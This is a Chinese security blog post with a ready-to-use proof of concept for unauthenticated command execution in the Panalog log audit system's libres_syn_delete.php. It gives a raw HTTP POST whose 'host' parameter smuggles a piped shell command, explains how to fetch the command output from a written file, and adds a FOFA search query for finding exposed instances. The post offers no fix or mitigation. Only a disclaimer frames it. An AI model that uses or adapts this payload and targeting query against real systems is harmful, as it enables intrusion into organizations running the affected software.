#  Panalog日志审计系统 libres_syn_delete.php命令执行漏洞   
小白菜安全  小白菜安全   2024-02-18 19:19  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
**Panalog<= MARS r10p1Free**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1woZiatcMgYibC1jNJGafZpaTzL1KWWb3QDPKYCWhcL1MnQXlQk2C3hwBTGzaQ8rMMOFbhj3o5Ay2Q/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
POST /content-apply/libres_syn_delete.php HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Length: 28
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

token=1&id=2&host=|id >1.txt
```  
  
漏洞复现  
1. 出现以下信息代表漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1woZiatcMgYibC1jNJGafZpaP1Tdo1pqC3cGgWByWcRZ00icvr1m8iaNS0zQFARK7klJvEFlvoJticVVQ/640?wx_fmt=png&from=appmsg "")  
  
2.访问代码执行结果url+/content-apply/1.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1woZiatcMgYibC1jNJGafZpagwjUJuyvZsHH1AbKe9GbHCxsS9coknicm6w7FZ6JahrQQSZ3I6uicJTA/640?wx_fmt=png&from=appmsg "")  
# 搜索语法  
  
**fofa：body="js/pad-zeropadding.js" && category="日志分析与审计"**  
  
  
  
